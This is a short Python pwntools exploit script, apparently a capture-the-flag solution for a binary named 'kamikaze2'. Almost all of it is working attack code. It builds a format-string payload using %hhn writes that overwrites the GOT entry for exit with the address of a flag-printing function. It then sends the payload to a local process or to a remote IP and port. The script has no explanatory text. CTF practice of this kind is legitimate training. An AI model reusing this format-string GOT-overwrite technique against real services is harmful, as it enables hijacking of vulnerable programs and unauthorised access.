#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
# context(log_level="debug", arch="i386", os="linux")
if debug == 1:
    p = process('./kamikaze2')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('13.53.125.206', 50000)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
addr_cat_flag = 0x08420736
got_exit = 0x08422024

# gdb.attach(p, "b *0x084208D8\nb *0x084208DD\nc\nsi")
pd = 'aa'
pd += p32(got_exit)
pd += p32(got_exit + 2)
pd += p32(got_exit + 1)
pd += '%40c%8$hhn'
pd += '%12c%9$hhn'
pd += '%197c%10$hhn'
p.sendlineafter('Topic: ', pd)
p.recvuntil('Will be the voting topic of today!\n')
p.interactive()
